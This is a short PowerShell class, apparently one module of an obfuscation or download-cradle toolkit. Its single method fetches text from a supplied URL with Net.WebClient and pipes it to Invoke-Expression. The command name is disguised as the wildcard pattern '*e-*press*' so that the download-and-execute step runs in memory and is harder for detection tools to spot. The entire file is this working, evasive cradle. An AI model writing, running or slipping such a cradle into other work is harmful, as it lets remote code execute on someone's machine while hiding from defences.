Class ObfDownloadFileContent10 {

    static Execute ([String]$url) {
        #CLI:  Memory\PsWebString\Invoke\4
        Write-Host (New-Object Net.WebClient).DownloadString($url)|.(COMMAND *e-*press*)
    }

}